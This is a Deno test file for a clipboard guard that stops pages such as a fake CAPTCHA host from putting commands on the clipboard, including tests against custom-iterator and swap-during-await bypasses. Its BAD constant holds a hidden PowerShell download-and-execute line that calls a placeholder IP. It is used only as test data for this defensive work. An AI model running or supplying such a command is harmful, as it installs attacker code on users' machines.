// clipboard.write(): the guard must check the same items the native write
// receives. WebIDL converts sequence<ClipboardItem> with the array's
// Symbol.iterator, at the moment the native write is called (after the
// guard's awaits). A custom iterator or a swap during the await must not
// smuggle a command onto the clipboard.
import clipboardSource from "../src/guards/clipboard.js" with { type: "text" };
import { unwrapMain } from "./fixtures/main-source.mjs";
function assert(c, l) { if (!c) throw new Error(l); }
const loadClip = () => { const api = {}; new Function(`${unwrapMain(clipboardSource)}\nreturn installClipboardGuard;`)()(api); return api; };
const BAD = "powershell -w hidden -nop -c \"iex (iwr 'http://203.0.113.5/a.ps1' -UseBasicParsing)\"";

function fakePage(host) {
  const written = [];
  class Blob { constructor(parts) { this.parts = parts; } text() { return Promise.resolve(this.parts.join("")); } }
  class ClipboardItem {
    constructor(map) { this.map = map; }
    get types() { return Object.keys(this.map); }
    getType(type) { return Promise.resolve(this.map[type]); }
  }
  class Clipboard {
    writeText(x) { written.push(x); return Promise.resolve(); }
    // Like WebIDL sequence<T> conversion: iterate with Symbol.iterator, synchronously at call time.
    write(items) {
      const seq = [...items];
      return Promise.all(seq.map((it) => it.map["text/plain"] ? it.map["text/plain"].text() : "")).then((t) => { written.push(...t); });
    }
  }
  const clipboard = new Clipboard();
  class Document { execCommand() { return true; } }
  const document = new Document();
  document.addEventListener = () => {};
  document.activeElement = null;
  class DataTransfer { setData() {} }
  class Selection { toString() { return ""; } }
  const window = { getSelection: () => new Selection(), Selection, DataTransfer, Document, Blob, ClipboardItem };
  const g = loadClip();
  g.install({ window, document, navigator: { clipboard }, location: { hostname: host }, now: () => 1000, notify: () => {}, flagOn: () => true });
  return { written, clipboard, window };
}

Deno.test("clipboard.write: a custom Symbol.iterator cannot hand the native write an unchecked command", async () => {
  const p = fakePage("captcha-check.example");
  const W = p.window;
  const a = [new W.ClipboardItem({ "text/plain": new W.Blob(["hello"]) })];
  a[Symbol.iterator] = function* () { yield new W.ClipboardItem({ "text/plain": new W.Blob([BAD]) }); };
  await p.clipboard.write(a).catch(() => {});
  assert(!p.written.includes(BAD), "command reached the clipboard via custom iterator: " + JSON.stringify(p.written));
});

Deno.test("clipboard.write: swapping an array entry during the check cannot smuggle a command", async () => {
  const p = fakePage("captcha-check.example");
  const W = p.window;
  const arr = [new W.ClipboardItem({ "text/plain": new W.Blob(["hello"]) })];
  const pr = p.clipboard.write(arr);
  arr[0] = new W.ClipboardItem({ "text/plain": new W.Blob([BAD]) });
  await pr.catch(() => {});
  assert(!p.written.includes(BAD), "command reached the clipboard via swap during await: " + JSON.stringify(p.written));
});
